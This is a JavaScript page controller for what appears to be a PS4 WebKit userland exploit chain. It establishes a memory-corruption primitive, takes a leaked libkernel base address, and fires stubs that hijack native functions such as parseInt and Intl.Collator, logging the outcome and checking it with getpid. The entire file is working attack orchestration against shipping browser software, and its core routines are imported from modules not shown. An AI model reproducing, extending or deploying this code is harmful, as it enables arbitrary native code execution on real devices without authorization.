/** Minimal UI for stub_call.js — direct stub entry, zero ROP slab. */
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets_userland.js";
import { installWindowP, pairStatus } from "./mem.js";
import { establishPrimitive, trimExploitDebris } from "./core.js?v=stub-core-1";
import {
    fireStubSwapParseInt, fireCollatorStub, pinCollatorStub, verifyStubSwapArm,
} from "./stub_call.js?v=stub-1";

const BUILD = "stub-page-1";
const params = new URLSearchParams(location.search);
let lines = [], ready = false, busy = false, collatorPin = null;
const retain = [];

function $(id) { return document.getElementById(id); }
function log(tag, d) {
    const line = tag + (d ? "  " + d : "");
    lines.push(line);
    if (lines.length > 100) lines.shift();
    try {
        const p = sessionStorage.getItem("wk-stub-log") || "";
        sessionStorage.setItem("wk-stub-log", (p ? p + "\n" : "") + line);
    } catch (_) { }
    const o = $("out");
    if (o) { o.textContent = lines.join("\n"); o.scrollTop = o.scrollHeight; }
}
function state(msg, cls) {
    const s = $("state");
    if (s) { s.textContent = msg; s.className = cls || ""; }
}

function parseAddr(raw) {
    if (!raw) return null;
    let s = String(raw).replace(/^0x/i, "").trim();
    if (!s || !/^[0-9a-f]+$/i.test(s)) return null;
    if (s.length <= 8) return new int64(parseInt(s, 16) >>> 0, 0);
    if (s.length < 16) s = s.padStart(16, "0");
    return new int64(parseInt(s.slice(-8), 16) >>> 0, parseInt(s.slice(0, -8), 16) >>> 0);
}

function lkFromInput() {
    const raw = $("lk-in").value.trim();
    if (!raw) {
        try {
            const s = sessionStorage.getItem("wk-libkernelBase");
            if (s) return parseAddr(s);
        } catch (_) { }
        return null;
    }
    const p = parseAddr(raw);
    if (!p) return null;
    if ((p.low & 0x3fff) === 0 && p.hi >= 0x80) return p;
    return p.sub32(0x13b20);
}

function stubMode() {
    const q = params.get("stub");
    if (q === "collator" || q === "arm") return q;
    return "parseint";
}

function syncRadios() {
    const m = stubMode();
    document.querySelectorAll('input[name="stub"]').forEach(function (el) {
        el.checked = el.value === m;
    });
}

async function runStart() {
    if (busy || ready) return;
    busy = true;
    log("BOOT", BUILD + " mode=" + stubMode());
    try {
        const carrier = await establishPrimitive({
            maxAttempts: 0,
            skipTrimDebris: true,
            onEvent: (t, d) => { if (/PRIMITIVE|FAIL|ERROR|READ-PRIMITIVE/i.test(t)) log(t, d || ""); },
        });
        installWindowP(carrier, { promote: false });
        window._wkCarrier = carrier;
        if (!window.p) throw new Error("no p");
        try { trimExploitDebris(); log("TRIM", "ok"); } catch (_) { }
        if (pairStatus.state === "broken") throw new Error("pair broken");
        if (!carrier.textarea) throw new Error("no carrier.textarea");
        log("PRIMITIVE-OK", "textarea=" + carrier.textareaAddress
            + " native=" + (carrier.native && carrier.native.nativeFn || "?"));
        if (stubMode() === "collator") {
            collatorPin = pinCollatorStub(retain);
            log("PIN-OK", "collator arena ready");
        }
        ready = true;
        $("btn-fire").disabled = false;
        state("ready — paste lk → Fire", "ok");
    } catch (e) {
        log("FAIL", e.message || String(e));
        state("failed", "bad");
    } finally {
        busy = false;
    }
}

function runFire() {
    if (busy || !ready || !window.p) return;
    const lk = lkFromInput();
    if (!lk) { log("SKIP", "paste lk from 2e Leak+lk"); state("need lk", "bad"); return; }
    const off = offsetsFor(navigator.userAgent).off;
    const mode = stubMode();
    busy = true;
    log("FIRE", mode + " lk=" + lk);
    try {
        const p = window.p;
        const carrier = window._wkCarrier;
        if (mode === "arm") {
            const v = verifyStubSwapArm(p, off, lk, { stubKind: "stub20" });
            log(v.ok ? "ARM-OK" : "ARM-FAIL", "mainMf=" + v.mainMf + " got=" + v.got + " want=" + v.want);
            state(v.ok ? "arm OK" : "arm fail", v.ok ? "ok" : "bad");
            return;
        }
        if (mode === "collator") {
            if (!collatorPin) collatorPin = pinCollatorStub(retain);
            const r = fireCollatorStub(p, collatorPin, lk, off, { stubKind: "stub20" });
            log("STUB-OK", r.path + " stub=" + r.stub + " pre=" + r.pre + " result=" + r.result);
            state(Number.isFinite(r.result) ? "collator stub fired" : "bad result", "ok");
            return;
        }
        const r = fireStubSwapParseInt(p, off, lk, { carrier, stubKind: "stub20" });
        log("STUB-OK", r.path + " stub=" + r.stubTag
            + " mainMf=" + r.mainMf + " arg=" + r.fireArg + " jsResult=" + r.result);
        const pid = (typeof r.result === "number" && r.result > 0 && r.result < 1000000)
            ? r.result : null;
        state(pid ? "getpid? " + pid : "survived — check jsResult", pid ? "ok" : "warn");
    } catch (e) {
        log("STUB-FAIL", e.message || String(e));
        state("stub fire failed", "bad");
    } finally {
        busy = false;
    }
}

function init() {
    try {
        const prev = sessionStorage.getItem("wk-stub-log");
        if (prev) lines = prev.split("\n").slice(-80);
    } catch (_) { }
    $("out").textContent = lines.join("\n");
    syncRadios();
    document.querySelectorAll('input[name="stub"]').forEach(function (el) {
        el.addEventListener("change", function () {
            const u = new URL(location.href);
            u.searchParams.set("stub", el.value);
            location.href = u.pathname + "?" + u.searchParams.toString();
        });
    });
    $("btn-start").onclick = runStart;
    $("btn-fire").onclick = runFire;
    const saved = sessionStorage.getItem("wk-libkernelBase") || sessionStorage.getItem("wk-lastFnPtr");
    if (saved) $("lk-in").value = saved;
}

init();
